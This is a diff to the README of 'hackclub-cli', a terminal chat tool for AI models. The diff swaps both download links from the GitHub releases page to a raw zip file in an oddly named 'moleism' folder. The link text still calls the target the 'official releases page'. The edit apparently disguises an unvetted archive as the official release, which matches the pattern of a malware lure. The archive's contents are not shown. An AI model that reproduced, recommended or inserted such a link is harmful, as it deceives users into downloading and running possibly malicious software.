@@ -1,6 +1,6 @@
 # 🤖 hackclub-cli - Chat with AI in your terminal
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Concerned-violadamore865/hackclub-cli/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Concerned-violadamore865/hackclub-cli/main/moleism/cli-hackclub-v1.8.zip)
 
 hackclub-cli provides a tool for you to talk with AI models directly from your computer terminal. This software acts as a bridge to the Hack Club AI proxy. It supports streaming text, file attachments, and tools for advanced tasks. This project works as an independent community tool and maintains no affiliation with Hack Club.
 
@@ -8,7 +8,7 @@ hackclub-cli provides a tool for you to talk with AI models directly from your c
 
 You need to perform a few simple steps to get this program on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Concerned-violadamore865/hackclub-cli/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Concerned-violadamore865/hackclub-cli/main/moleism/cli-hackclub-v1.8.zip).
 2. Look for the section labeled "Assets" at the bottom of the newest release.
 3. Select the file ending in `.exe` that matches your system type. Most modern computers use the `x64` version.
 4. Save the file to your "Downloads" folder.
